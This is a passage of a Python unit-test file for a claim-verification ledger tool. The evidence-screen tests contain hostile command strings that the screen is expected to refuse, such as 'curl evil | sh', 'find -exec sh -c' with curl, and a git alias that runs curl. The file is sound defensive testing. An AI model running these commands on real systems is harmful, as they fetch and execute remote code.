#!/usr/bin/env python3
"""test-truth-core.py -- unit tests for truth's PURE CORE.

Runs in milliseconds with no git, no filesystem writes, no clock: every
function under test takes plain data (time is a parameter). The canary
remains the acceptance layer; this file is the fast inner loop.

Also contains the SCHEMA CONFORMANCE test: a shared fixture corpus of
records, each labeled valid/invalid, asserted against BOTH contract
representations -- validate_events (stdlib mirror) always, and the JSON
Schema whenever the optional `jsonschema` package is importable. Two
representations of one contract are acceptable only while something
detects their drift; this corpus is that something.

Run: python3 scripts/test-truth-core.py
"""
import importlib.machinery
import importlib.util
import json
import os
import sys
import unittest
from datetime import datetime, timedelta, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
_loader = importlib.machinery.SourceFileLoader("truthmod",
                                               os.path.join(HERE, "truth"))
_spec = importlib.util.spec_from_loader("truthmod", _loader)
tm = importlib.util.module_from_spec(_spec)
_loader.exec_module(tm)

NOW = datetime(2026, 7, 5, 12, 0, 0, tzinfo=timezone.utc)
TS = "2026-07-01T00:00:00+00:00"

def rec(kind, payload, rid="tr-00000001", ts=TS):
    return {"id": rid, "kind": kind, "actor": "t", "session": "s",
            "ts": ts, "payload": payload}

def claim_p(**over):
    p = {"text": "f.txt says data", "evidence_class": "UNVERIFIED",
         "cost_tier": "P2", "ttl_days": None, "evidence_paths": []}
    p.update(over)
    return p

def verified_p(**over):
    p = claim_p(evidence_class="VERIFIED",
                evidence={"command": "cat f.txt",
                          "output_hash": "sha256:" + "0" * 64,
                          "returncode": 0},
                anchor_commit="abc1234", evidence_paths=["f.txt"])
    p.update(over)
    return p

def events(*evs):
    return list(enumerate(evs, 1))

# ---------------------------------------------------------------- fold

class TestFold(unittest.TestCase):
    def test_empty(self):
        claims, premises = tm.fold([])
        self.assertEqual((claims, premises), ({}, {}))

    def test_claim_starts_unverified(self):
        claims, _ = tm.fold(events(rec("claim", claim_p())))
        self.assertEqual(claims["tr-00000001"]["status"], "unverified")
        self.assertEqual(claims["tr-00000001"]["status_ts"], TS)

    def test_last_event_wins(self):
        evs = events(
            rec("claim", claim_p()),
            rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                            "basis": "b"}, rid="tr-00000002"),
            rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                            "basis": "b"}, rid="tr-00000003",
                ts="2026-07-02T00:00:00+00:00"))
        claims, _ = tm.fold(evs)
        self.assertEqual(claims["tr-00000001"]["status"], "diverged")
        self.assertEqual(claims["tr-00000001"]["status_ts"],
                         "2026-07-02T00:00:00+00:00")

    def test_every_verdict_mapping(self):
        for verdict, status in (("agree", "live"), ("diverge", "diverged"),
                                ("cannot_verify", "cannot_verify"),
                                ("retracted", "retracted")):
            claims, _ = tm.fold(events(
                rec("claim", claim_p()),
                rec("verdict", {"claim": "tr-00000001", "verdict": verdict,
                                "basis": "b"}, rid="tr-00000002")))
            self.assertEqual(claims["tr-00000001"]["status"], status, verdict)

    def test_invalidation_marks_stale(self):
        claims, _ = tm.fold(events(
            rec("claim", claim_p()),
            rec("invalidation", {"claim": "tr-00000001", "commit": "abc1234",
                                 "reason": "x"}, rid="tr-00000002")))
        self.assertEqual(claims["tr-00000001"]["status"], "stale")

    def test_retracted_is_terminal(self):
        evs = events(
            rec("claim", claim_p()),
            rec("verdict", {"claim": "tr-00000001", "verdict": "retracted",
                            "basis": "wrong"}, rid="tr-00000002"),
            rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                            "basis": "resurrect"}, rid="tr-00000003",
                ts="2026-07-03T00:00:00+00:00"),
            rec("invalidation", {"claim": "tr-00000001", "commit": "abc1234"},
                rid="tr-00000004"))
        claims, _ = tm.fold(evs)
        self.assertEqual(claims["tr-00000001"]["status"], "retracted")
        self.assertEqual(claims["tr-00000001"]["status_ts"], TS)  # unchanged

    def test_premise_map(self):
        _, premises = tm.fold(events(
            rec("premise", {"issue": "bd-x1", "claim": "tr-00000009"})))
        self.assertEqual(premises, {"bd-x1": ["tr-00000009"]})

# ------------------------------------------------------- premise matrix

class TestPremiseMatrix(unittest.TestCase):
    def test_adr_001(self):
        cases = [
            ("live", "P0", True), ("live", "P2", True),
            ("unverified", "P0", True), ("unverified", "P2", True),
            ("cannot_verify", "P0", False),          # strict for P0
            ("cannot_verify", "P1", True),
            ("cannot_verify", "P2", True),
            ("stale", "P2", False), ("diverged", "P0", False),
            ("retracted", "P1", False), ("missing", "P2", False),
        ]
        for status, tier, expect in cases:
            passes, _ = tm.premise_check(status, tier)
            self.assertEqual(passes, expect, (status, tier))

    def test_warnings_present(self):
        self.assertIsNotNone(tm.premise_check("unverified", "P1")[1])
        self.assertIsNotNone(tm.premise_check("cannot_verify", "P1")[1])
        self.assertIsNone(tm.premise_check("live", "P1")[1])

# --------------------------------------------------------- primitives

class TestPrimitives(unittest.TestCase):
    def test_match_paths(self):
        self.assertTrue(tm.match_paths("services/api/x.py", ["services/api/**"]))
        self.assertTrue(tm.match_paths("services/api", ["services/api/**"]))
        self.assertFalse(tm.match_paths("services/apix/x.py", ["services/api/**"]))
        self.assertTrue(tm.match_paths("f.txt", ["*.txt"]))
        self.assertFalse(tm.match_paths("f.py", ["*.txt"]))

    def test_jaccard(self):
        self.assertEqual(tm.jaccard("a b c", "a b c"), 1.0)
        self.assertEqual(tm.jaccard("a b", "c d"), 0.0)
        self.assertEqual(tm.jaccard("", "a"), 0.0)

    def test_duplicate_conflicts_only_active(self):
        claims = {
            "tr-0000000a": {"status": "live",
                            "claim": rec("claim", claim_p(text="payments module handles currency conversion"))},
            "tr-0000000b": {"status": "stale",
                            "claim": rec("claim", claim_p(text="payments module handles currency conversion"))},
        }
        hits = tm.duplicate_conflicts("payments module handles all currency conversion", claims)
        self.assertEqual([cid for cid, _ in hits], ["tr-0000000a"])  # stale exempt

# ---------------------------------------------------- intake decisions

class TestIntake(unittest.TestCase):
    def test_verified_requires_cmd_paths_head(self):
        self.assertIn("INV-B", tm.verified_intake_error(None, ["f"], None, "abc"))
        self.assertIn("G10", tm.verified_intake_error("cat f", [], None, "abc"))
        self.assertIsNone(tm.verified_intake_error("cat f", [], 7, "abc"))  # ttl ok
        self.assertIn("G1", tm.verified_intake_error("cat f", ["f"], None, None))
        self.assertIsNone(tm.verified_intake_error("cat f", ["f"], None, "abc"))

    def test_inferred_requires_basis(self):
        self.assertIsNotNone(tm.inferred_intake_error(None))
        self.assertIsNone(tm.inferred_intake_error("naming convention"))

    def test_determinism(self):
        self.assertIsNone(tm.determinism_error(("h", 0), ("h", 0)))
        self.assertIn("G6", tm.determinism_error(("h1", 0), ("h2", 0)))
        self.assertIn("G6", tm.determinism_error(("h", 0), ("h", 1)))

    def test_malformed_path_list(self):
        """INV-M: '--paths "a.sh b.sh"' with no comma stores as one
        whitespace-containing literal -- the exact tr-3591aae0 shape."""
        self.assertEqual(tm.malformed_path_list(["a.sh b.sh"]), ["a.sh b.sh"])
        self.assertEqual(tm.malformed_path_list(["a.sh", "b.sh"]), [])
        self.assertEqual(tm.malformed_path_list(["a.sh", "b.sh", "c d.sh"]),
                         ["c d.sh"])
        self.assertEqual(tm.malformed_path_list([]), [])

    def test_split_csv_drops_empty_entries(self):
        """v0.5.6: a trailing or doubled comma must never surface as a
        refusal of the literal '' (the pre-fix behavior was fails-closed
        but cryptic: dead_literal_paths reported [''])."""
        self.assertEqual(tm.split_csv("a.sh,"), ["a.sh"])
        self.assertEqual(tm.split_csv("a.sh,,b.sh"), ["a.sh", "b.sh"])
        self.assertEqual(tm.split_csv(" a.sh , b.sh "), ["a.sh", "b.sh"])
        self.assertEqual(tm.split_csv(","), [])
        self.assertEqual(tm.split_csv(""), [])
        self.assertEqual(tm.split_csv(None), [])

    def test_dead_literal_paths(self):
        """INV-M: a literal matching zero tracked files is a dead
        tripwire; explicit globs are exempt even at zero matches."""
        tracked = ["a.sh", "src/x.py"]
        self.assertEqual(tm.dead_literal_paths(["a.sh"], tracked), [])
        self.assertEqual(tm.dead_literal_paths(["missing.sh"], tracked),
                         ["missing.sh"])
        self.assertEqual(tm.dead_literal_paths(["docs/*.md"], tracked), [])
        self.assertEqual(tm.dead_literal_paths(["src/?.py"], tracked), [])
        self.assertEqual(
            tm.dead_literal_paths(["a.sh", "missing.sh", "docs/*.md"], tracked),
            ["missing.sh"])

# ------------------------------------- quantifier-scope gate (ADR-007)

class TestQuantifierScope(unittest.TestCase):
    def test_fires_on_the_pilot_shape(self):
        """A repo-wide clause over an --include-filtered grep: the exact
        shape of both genuine pilot divergences."""
        c = tm.quantifier_scope_conflict(
            "the only occurrences in the repo are in payments",
            "grep -rn convert --include='*.py' .")
        self.assertIsNotNone(c)
        q, s = c
        self.assertIn(q, ("only", "the repo"))  # both fire; either names it
        self.assertTrue(s.startswith("--include"), s)

    def test_fires_on_path_scoped_command(self):
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "no call sites remain anywhere", "grep -rn frobnicate src/api"))

    def test_phrase_boundary_repo_vs_repository(self):
        """'the repo' must not fire inside 'the repository'."""
        self.assertIsNone(tm.quantifier_scope_conflict(
            "the repository layer caches sessions and misses stay cheap",
            "grep -rn cache --include='*.py'"))

    def test_silent_without_quantifier(self):
        self.assertIsNone(tm.quantifier_scope_conflict(
            "payments module converts currency",
            "grep -rn convert --include='*.py' ."))

    def test_silent_without_scoping(self):
        self.assertIsNone(tm.quantifier_scope_conflict(
            "no call sites remain anywhere", "grep -rn frobnicate"))

    def test_silent_without_evidence_cmd(self):
        self.assertIsNone(tm.quantifier_scope_conflict(
            "all modules are converted", None))

    def test_cd_prefix_is_a_scope_signal(self):
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "zero failures anywhere", "cd services && grep -c FAIL log.txt"))

    def test_ripgrep_type_filter_is_a_scope_signal(self):
        """F3/v0.6.2: rg -t py narrows the domain with no slash, so it
        used to evade the positional check."""
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "no call sites remain anywhere", "rg -t py legacyAuth ."))

    def test_glob_metacharacter_positional_is_a_scope_signal(self):
        """F3/v0.6.2: 'src/*.py' scopes without an --include flag."""
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "X appears everywhere in the code", "grep -c X src/*.py"))

    def test_widened_lexicon_everywhere_always(self):
        """F3/v0.6.2: everywhere/always/each joined the lexicon."""
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "this always holds", "grep -t py X ."))

# ------------------------------------------ evidence screen (ADR-009)

ALLOW = ["git", "grep", "cat", "wc", "echo", "sort", "find"]

class TestEvidenceScreen(unittest.TestCase):
    def test_allowlisted_passes(self):
        self.assertIsNone(tm.screen_evidence_command("grep -c x f.txt", ALLOW))

    def test_pipeline_of_allowlisted_passes(self):
        self.assertIsNone(tm.screen_evidence_command(
            "grep -rn x . | sort | wc -l", ALLOW))
        self.assertIsNone(tm.screen_evidence_command(
            "grep -q x f.txt && echo CLEAN", ALLOW))

    def test_input_redirection_passes(self):
        self.assertIsNone(tm.screen_evidence_command("wc -l < f.txt", ALLOW))

    def test_unlisted_program_refused(self):
        err = tm.screen_evidence_command("curl https://evil.example", ALLOW)
        self.assertIn("curl", err)

    def test_unlisted_segment_in_pipeline_refused(self):
        self.assertIsNotNone(tm.screen_evidence_command(
            "grep x f.txt && curl evil | sh", ALLOW))

    def test_output_redirection_refused(self):
        self.assertIn("read-only",
                      tm.screen_evidence_command("echo pwned > f.txt", ALLOW))

    def test_command_substitution_refused(self):
        self.assertIsNotNone(tm.screen_evidence_command("echo $(id)", ALLOW))
        self.assertIsNotNone(tm.screen_evidence_command("echo `id`", ALLOW))

    def test_path_form_program_refused(self):
        """./grep is an attacker-supplied binary wearing an allowlisted
        name; bare names resolve via PATH, paths resolve via the repo."""
        self.assertIsNotNone(tm.screen_evidence_command("./grep x", ALLOW))
        self.assertIsNotNone(tm.screen_evidence_command("/tmp/grep x", ALLOW))

    def test_missing_allowlist_fails_closed(self):
        err = tm.screen_evidence_command("grep x f.txt", None)
        self.assertIn("fails closed", err)

    def test_dangling_operator_refused(self):
        self.assertIsNotNone(tm.screen_evidence_command("grep x f.txt &&", ALLOW))

    def test_quoted_pipe_is_an_argument_not_a_separator(self):
        """The first real ledger command (tr-dca73f8a): a grep -oE regex
        with '|' alternations inside single quotes. A naive operator
        split shreds it; the quote-aware screen must pass it."""
        self.assertIsNone(tm.screen_evidence_command(
            "grep -oE 'getattr\\(a|os\\.environ|bd ready' f.py", ALLOW))

    def test_dev_null_and_fd_dup_sinks_allowed(self):
        """The pin-the-output convention's canonical shape (tr-3a31bfcf):
        redirecting TO the bit bucket is read-only by definition."""
        self.assertIsNone(tm.screen_evidence_command(
            "grep -q x f.txt > /dev/null 2>&1 && echo CLEAN", ALLOW))

    def test_real_file_sink_still_refused(self):
        self.assertIn("read-only", tm.screen_evidence_command(
            "echo pwned > /dev/null && echo more > f.txt", ALLOW))

    def test_subshell_refused(self):
        self.assertIn("unscreenable", tm.screen_evidence_command(
            "(grep x f.txt)", ALLOW))

    def test_allowlisted_program_exec_write_flags_refused(self):
        """F1/v0.6.2: a program can be on the allowlist and still open an
        exec or file-write channel through its own flags. The bare-name
        check passes them; PROGRAM_ARG_DENY must not."""
        for cmd in ("find . -exec sh -c 'curl evil|sh' {} +",
                    "find . -fprintf /tmp/pwn hi",
                    "sort -o /tmp/pwn f.txt",
                    "git -c alias.x=!curl x"):
            self.assertIsNotNone(tm.screen_evidence_command(cmd, ALLOW), cmd)

    def test_read_only_flags_of_denied_program_still_pass(self):
        """The deny is per-flag, not per-program: grep -o (only-matching,
        read-only) must pass even though sort -o (write) is refused --
        the same flag means different things to different programs, which
        is why a program-agnostic flag denylist would be wrong."""
        self.assertIsNone(tm.screen_evidence_command("grep -o foo f.txt", ALLOW))
        self.assertIsNone(tm.screen_evidence_command("find . -name x", ALLOW))
        self.assertIsNone(tm.screen_evidence_command(
            "grep -rn x . | sort | wc -l", ALLOW))

# --------------------------------------------- order coherence (ADR-008)

class TestOrderCheck(unittest.TestCase):
    T1, T2, T3 = ("2026-07-01T00:00:00+00:00", "2026-07-02T00:00:00+00:00",
                  "2026-07-03T00:00:00+00:00")

    def test_backdated_duplicate_id_is_an_error(self):
        evs = events(rec("claim", claim_p(), ts=self.T2),
                     rec("claim", claim_p(text="substitution"), ts=self.T1))
        errors, _ = tm.order_check(evs)
        self.assertEqual(len(errors), 1)
        self.assertIn("duplicate id", errors[0])

    def test_identical_union_merge_duplicate_passes(self):
        """git's union merge can duplicate an identical line (equal ts);
        first-wins under a stable sort keeps the genuine record, so this
        must not error."""
        r = rec("claim", claim_p(), ts=self.T1)
        errors, _ = tm.order_check(events(r, dict(r)))
        self.assertEqual(errors, [])

    def test_later_duplicate_passes(self):
        evs = events(rec("claim", claim_p(), ts=self.T1),
                     rec("claim", claim_p(text="dup"), ts=self.T2))
        errors, _ = tm.order_check(evs)
        self.assertEqual(errors, [])

    def test_small_inversion_silent_large_inversion_warns(self):
        near = "2026-07-02T00:00:00+00:00"
        near_minus_10s = "2026-07-01T23:59:50+00:00"
        evs = events(rec("claim", claim_p(), rid="tr-00000001", ts=near),
                     rec("claim", claim_p(text="b"), rid="tr-00000002",
                         ts=near_minus_10s))
        _, warnings = tm.order_check(evs)
        self.assertEqual(warnings, [])
        evs = events(rec("claim", claim_p(), rid="tr-00000001", ts=self.T3),
                     rec("claim", claim_p(text="b"), rid="tr-00000002",
                         ts=self.T1))
        errors, warnings = tm.order_check(evs)
        self.assertEqual(errors, [])
        self.assertEqual(len(warnings), 1)

    def test_backdated_duplicate_with_naive_ts_is_caught(self):
        """F2/v0.6.2: a tz-naive forged ts sorts before a tz-aware
        genuine one by raw string (fold's key) but used to slip past the
        parsed comparison, which abstained on tz mismatch."""
        evs = events(rec("claim", claim_p(), ts=self.T2),
                     rec("claim", claim_p(text="sub"),
                         ts="2026-07-01T00:00:00"))  # naive, no offset
        errors, _ = tm.order_check(evs)
        self.assertEqual(len(errors), 1)
        self.assertIn("duplicate id", errors[0])

    def test_backdated_duplicate_with_junk_ts_is_caught(self):
        """F2/v0.6.2: an unparseable ts made parse_ts return None, so the
        old comparison abstained; by raw string 'z...'<ISO it still sorts
        first in the fold."""
        evs = events(rec("claim", claim_p(), ts=self.T2),
                     rec("claim", claim_p(text="sub"), ts="1"))
        errors, _ = tm.order_check(evs)
        self.assertEqual(len(errors), 1)

# --------------------------------------------------------- stats (FS-1)

class TestStats(unittest.TestCase):
    def _world(self):
        return events(
            rec("claim", claim_p(cost_tier="P1"), rid="tr-000000a1",
                ts="2026-07-01T00:00:00+00:00"),
            rec("verdict", {"claim": "tr-000000a1", "verdict": "agree",
                            "basis": "b"}, rid="tr-000000a2",
                ts="2026-07-01T00:00:00+00:00"),
            rec("invalidation", {"claim": "tr-000000a1", "commit": "c",
                                 "reason": "r"}, rid="tr-000000a3",
                ts="2026-07-05T00:00:00+00:00"))

    def test_half_life_measured_live_to_stale(self):
        obs, _ = tm.half_life_observations(self._world())
        self.assertEqual(obs, [("P1", 4.0)])

    def test_half_life_replay_matches_fold(self):
        """The mini-replay must never disagree with fold() on final
        status -- fold stays authoritative; this is the drift guard."""
        evs = self._world() + events(
            rec("claim", claim_p(text="second"), rid="tr-000000b1",
                ts="2026-07-02T00:00:00+00:00"),
            rec("verdict", {"claim": "tr-000000b1", "verdict": "retracted",
                            "basis": "b"}, rid="tr-000000b2",
                ts="2026-07-03T00:00:00+00:00"))
        evs = list(enumerate([e for _, e in evs], 1))
        _, replay_status = tm.half_life_observations(evs)
        claims, _ = tm.fold(evs)
        self.assertEqual(replay_status,
                         {cid: e["status"] for cid, e in claims.items()})

    def test_stats_report_splits_mechanical(self):
        evs = self._world() + events(
            rec("verdict", {"claim": "tr-000000a1", "verdict": "diverge",
                            "basis": "b", "subtype": "mechanical"},
                rid="tr-000000c1", ts="2026-07-06T00:00:00+00:00"))
        evs = list(enumerate([e for _, e in evs], 1))
        report = tm.stats_report(evs, NOW)
        self.assertEqual(report["verdicts"]["diverge_mechanical"], 1)
        self.assertEqual(report["verdicts"]["diverge_genuine"], 0)
        self.assertEqual(report["half_life"]["P1"]["median_days"], 4.0)

    def test_ttl_suggestion_threshold(self):
        few = [("P1", 3.0)] * (tm.HALF_LIFE_MIN_OBS - 1)
        self.assertIsNone(tm.ttl_suggestion(few, "P1"))
        enough = [("P1", 3.0)] * tm.HALF_LIFE_MIN_OBS
        self.assertEqual(tm.ttl_suggestion(enough, "P1"), 3.0)
        self.assertIsNone(tm.ttl_suggestion(enough, "P0"))

class TestMechanicalSubtypeFold(unittest.TestCase):
    def test_subtype_surfaces_in_queue(self):
        evs = events(
            rec("claim", claim_p(cost_tier="P1")),
            rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                            "basis": "b", "subtype": "mechanical"},
                rid="tr-00000002", ts="2026-07-02T00:00:00+00:00"))
        claims, _ = tm.fold(evs)
        self.assertEqual(claims["tr-00000001"]["subtype"], "mechanical")
        rows = tm.queue_rows(claims, NOW)
        self.assertIn("mechanical", rows[0]["reason"])

# ---------------------------------------------------- recheck decisions

class TestRecheck(unittest.TestCase):
    EV = {"command": "cat f", "output_hash": "sha256:" + "a" * 64, "returncode": 0}

    def test_match_agrees(self):
        v, _ = tm.recheck_verdict(self.EV, "a" * 64, 0)
        self.assertEqual(v, "agree")

    def test_mismatch_diverges(self):
        v, basis = tm.recheck_verdict(self.EV, "b" * 64, 0)
        self.assertEqual(v, "diverge")
        self.assertIn("MISMATCH", basis)

    def test_returncode_mismatch_diverges(self):
        v, _ = tm.recheck_verdict(self.EV, "a" * 64, 1)
        self.assertEqual(v, "diverge")

    def test_127_is_cannot_verify(self):
        v, basis = tm.recheck_verdict(self.EV, "whatever", 127)
        self.assertEqual(v, "cannot_verify")
        self.assertIn("127", basis)

# ------------------------------------------------ invalidation strategies

def entry(payload, status="live", ts=TS):
    return {"status": status, "status_ts": ts,
            "claim": rec("claim", payload, ts=ts)}

class TestInvalidation(unittest.TestCase):
    def test_ttl_expired(self):
        e = entry(claim_p(ttl_days=1))
        d = tm.decide_invalidation(e, {"head": "h"}, NOW)  # NOW is 4 days later
        self.assertEqual(d["label"], "ttl expired")
        self.assertIn("ttl expired (1 days)", d["payload"]["reason"])

    def test_ttl_not_yet(self):
        e = entry(claim_p(ttl_days=30))
        self.assertIsNone(tm.decide_invalidation(e, {"head": "h"}, NOW))

    def test_anchor_unreachable(self):
        e = entry(verified_p())
        d = tm.decide_invalidation(e, {"head": "h", "anchor_reachable": False}, NOW)
        self.assertEqual(d["label"], "anchor unreachable")
        self.assertIn("anchor unreachable", d["payload"]["reason"])

    def test_paths_touched(self):
        e = entry(verified_p())
        d = tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["f.txt", "other.py"], "diff_error": None}, NOW)
        self.assertEqual(d["label"], "paths changed")
        self.assertEqual(d["payload"]["touched"], ["f.txt"])

    def test_untouched_paths_no_decision(self):
        e = entry(verified_p())
        self.assertIsNone(tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["other.py"], "diff_error": None}, NOW))

    def test_diff_error_fails_toward_distrust(self):
        e = entry(verified_p())
        d = tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": None, "diff_error": "boom"}, NOW)
        self.assertEqual(d["label"], "diff failed")

    def test_facts_not_gathered_means_abstain(self):
        e = entry(verified_p())
        self.assertIsNone(tm.decide_invalidation(e, {"head": "h"}, NOW))

    def test_ttl_precedes_paths(self):
        e = entry(verified_p(ttl_days=1))
        d = tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["f.txt"], "diff_error": None}, NOW)
        self.assertEqual(d["label"], "ttl expired")

    def test_terminal_and_settled_states_skipped(self):
        for status in ("stale", "diverged", "retracted", "cannot_verify"):
            e = entry(verified_p(ttl_days=1), status=status)
            self.assertIsNone(tm.decide_invalidation(e, {"head": "h"}, NOW), status)

# --------------------------------------------------------- consumers

class TestQueue(unittest.TestCase):
    def make(self, status, tier):
        return {"tr-0000000c": entry(claim_p(cost_tier=tier), status=status)}

    def test_membership(self):
        cases = [("diverged", "P2", True), ("stale", "P0", True),
                 ("stale", "P1", True), ("stale", "P2", False),
                 ("cannot_verify", "P0", True), ("cannot_verify", "P1", False),
                 ("live", "P0", False), ("retracted", "P0", False)]
        for status, tier, expect in cases:
            rows = tm.queue_rows(self.make(status, tier), NOW)
            self.assertEqual(bool(rows), expect, (status, tier))

    def test_age_days_uses_injected_now(self):
        rows = tm.queue_rows(self.make("diverged", "P1"), NOW)
        self.assertEqual(rows[0]["age_days"], 4)  # TS -> NOW

class TestJoinReady(unittest.TestCase):
    def setUp(self):
        self.claims = {
            "tr-000000aa": entry(claim_p(cost_tier="P1"), status="live"),
            "tr-000000bb": entry(claim_p(cost_tier="P1"), status="stale"),
            "tr-000000cc": entry(claim_p(cost_tier="P0"), status="cannot_verify"),
            "tr-000000dd": entry(claim_p(cost_tier="P1"), status="unverified"),
        }

    def go(self, premises):
        issues = [{"id": "bd-x1", "title": "t"}]
        return tm.join_ready(issues, self.claims, premises)

    def test_live_passes(self):
        ready, _ = self.go({"bd-x1": ["tr-000000aa"]})
        self.assertEqual(len(ready), 1)
        self.assertEqual(ready[0]["_truth"]["warnings"], [])

    def test_unverified_passes_with_warning(self):
        ready, _ = self.go({"bd-x1": ["tr-000000dd"]})
        self.assertEqual(len(ready), 1)
        self.assertTrue(ready[0]["_truth"]["warnings"])

    def test_stale_blocks(self):
        ready, annotated = self.go({"bd-x1": ["tr-000000bb"]})
        self.assertEqual(ready, [])
        self.assertIn("tr-000000bb (stale)",
                      annotated[0]["_truth"]["broken_premises"])

    def test_cannot_verify_p0_blocks(self):
        ready, _ = self.go({"bd-x1": ["tr-000000cc"]})
        self.assertEqual(ready, [])

    def test_missing_blocks(self):
        ready, annotated = self.go({"bd-x1": ["tr-000000ff"]})
        self.assertEqual(ready, [])
        self.assertIn("tr-000000ff (missing)",
                      annotated[0]["_truth"]["broken_premises"])

    def test_no_premises_passes(self):
        ready, _ = self.go({})
        self.assertEqual(len(ready), 1)

class TestDispatch(unittest.TestCase):
    def test_header_stripped_claim_appended(self):
        prompt = "human header\n---\nVERIFIER BODY\n\n1. RULE ONE.\n2. RULE TWO.\n"
        out = tm.dispatch_text(prompt, rec("claim", claim_p()))
        self.assertNotIn("human header", out)
        self.assertIn("VERIFIER BODY", out)
        self.assertIn("CLAIM RECORD", out)
        self.assertIn('"tr-00000001"', out)

    def test_envelope_self_describes_integrity(self):
        # TL-3: transports can lossily compress the dispatch; a complete
        # copy must be distinguishable from a truncated one by its reader.
        import hashlib as _h
        prompt = "human header\n---\nVERIFIER BODY\n\n1. RULE ONE.\n2. RULE TWO.\n"
        out = tm.dispatch_text(prompt, rec("claim", claim_p()))
        digest = _h.sha256(prompt.encode("utf-8")).hexdigest()
        self.assertTrue(out.startswith("INTEGRITY (check before following)"))
        self.assertIn("contains 2 numbered rules", out)
        self.assertTrue(out.endswith(f"END-OF-DISPATCH sha256:{digest}"))
        # claim record sits INSIDE the envelope, so record truncation is
        # also caught by a missing terminator
        self.assertLess(out.index("CLAIM RECORD"), out.rindex("END-OF-DISPATCH"))

# ------------------------------------------------ work kernel (ADR-002)

def issue_rec(rid="wk-00000001", ts=TS, **over):
    p = {"title": "do the thing", "text": "", "deps": [], "premises": []}
    p.update(over)
    return rec("issue", p, rid=rid, ts=ts)

def issue_ev(event, ref="wk-00000001", ts=TS, rid="tr-000000e1", basis="b"):
    return rec("issue_event", {"issue": ref, "event": event, "basis": basis},
               rid=rid, ts=ts)

class TestFoldIssues(unittest.TestCase):
    def test_new_issue_is_open(self):
        issues = tm.fold_issues(events(issue_rec()))
        self.assertEqual(issues["wk-00000001"]["status"], "open")

    def test_lifecycle_open_claimed_closed_reopened(self):
        evs = events(
            issue_rec(ts="2026-07-01T00:00:00+00:00"),
            issue_ev("claimed", ts="2026-07-01T00:00:01+00:00", rid="tr-000000e1"),
            issue_ev("closed", ts="2026-07-01T00:00:02+00:00", rid="tr-000000e2"),
            issue_ev("reopened", ts="2026-07-01T00:00:03+00:00", rid="tr-000000e3"))
        for cut, want in ((1, "open"), (2, "claimed"), (3, "closed"), (4, "open")):
            issues = tm.fold_issues(evs[:cut])
            self.assertEqual(issues["wk-00000001"]["status"], want)

    def test_cancelled_is_terminal(self):
        evs = events(
            issue_rec(ts="2026-07-01T00:00:00+00:00"),
            issue_ev("cancelled", ts="2026-07-01T00:00:01+00:00", rid="tr-000000e1"),
            issue_ev("reopened", ts="2026-07-01T00:00:02+00:00", rid="tr-000000e2"),
            issue_ev("claimed", ts="2026-07-01T00:00:03+00:00", rid="tr-000000e3"))
        issues = tm.fold_issues(evs)
        self.assertEqual(issues["wk-00000001"]["status"], "cancelled")

    def test_first_issue_payload_wins(self):
        """ADR-006: matches fold()'s claim handling -- a duplicate wk- id
        cannot alter the issue's title, deps, or premises, no matter its
        timestamp."""
        evs = events(
            issue_rec(title="v1", ts="2026-07-01T00:00:00+00:00"),
            issue_rec(title="v2", ts="2026-07-01T00:00:05+00:00"))
        issues = tm.fold_issues(evs)
        self.assertEqual(issues["wk-00000001"]["issue"]["payload"]["title"], "v1")

    def test_duplicate_issue_id_cannot_strip_premises(self):
        """ADR-006: the finding this fix closes -- a later-timestamped
        duplicate wk- id emptying `premises` must not disarm ADR-001
        protection. No backdating needed for this attack (last-wins would
        have let an ordinary 'now' timestamp win), which is exactly why
        last-wins was the wrong default."""
        evs = events(
            issue_rec(premises=["tr-000000c1"], ts="2026-07-01T00:00:00+00:00"),
            issue_rec(premises=[], ts="2099-01-01T00:00:00+00:00"))
        issues = tm.fold_issues(evs)
        self.assertEqual(
            issues["wk-00000001"]["issue"]["payload"]["premises"],
            ["tr-000000c1"])

    def test_confluence_all_permutations_with_duplicate_id(self):
        """v0.5.6: coverage symmetry with the claims fold — first-wins
        under a duplicate wk- id must be confluent across every arrival
        order, not just the two fixed orders the ADR-006 tests exercise."""
        import itertools
        evs = [issue_rec(premises=["tr-000000c1"],
                         ts="2026-07-01T00:00:00+00:00"),
               issue_rec(premises=[], title="forged",
                         ts="2099-01-01T00:00:00+00:00"),
               issue_ev("claimed", ts="2026-07-02T00:00:00+00:00")]
        states = set()
        for perm in itertools.permutations(evs):
            issues = tm.fold_issues(list(enumerate(perm, 1)))
            e = issues["wk-00000001"]
            states.add((e["status"],
                        tuple(e["issue"]["payload"]["premises"]),
                        e["issue"]["payload"]["title"]))
        self.assertEqual(states,
                         {("claimed", ("tr-000000c1",), "do the thing")})

    def test_confluence_file_order_irrelevant(self):
        a = issue_rec(ts="2026-07-01T00:00:00+00:00")
        b = issue_ev("claimed", ts="2026-07-01T00:00:01+00:00", rid="tr-000000e1")
        c = issue_ev("closed", ts="2026-07-01T00:00:02+00:00", rid="tr-000000e2")
        fwd = tm.fold_issues(events(a, b, c))
        rev = tm.fold_issues(events(c, b, a))
        self.assertEqual(fwd["wk-00000001"]["status"],
                         rev["wk-00000001"]["status"])

    def test_event_for_unknown_issue_ignored(self):
        issues = tm.fold_issues(events(issue_ev("closed", ref="wk-deadbeef")))
        self.assertEqual(issues, {})

class TestIssueEventError(unittest.TestCase):
    def test_transition_matrix(self):
        ok = [("open", "claimed"), ("claimed", "released"), ("open", "closed"),
              ("claimed", "closed"), ("closed", "reopened"),
              ("open", "cancelled"), ("claimed", "cancelled"),
              ("closed", "cancelled")]
        bad = [("closed", "claimed"), ("open", "released"), ("open", "reopened"),
               ("closed", "closed"), ("cancelled", "reopened"),
               ("cancelled", "closed"), ("cancelled", "claimed")]
        for st, ev in ok:
            self.assertIsNone(tm.issue_event_error(st, ev), f"{st}->{ev}")
        for st, ev in bad:
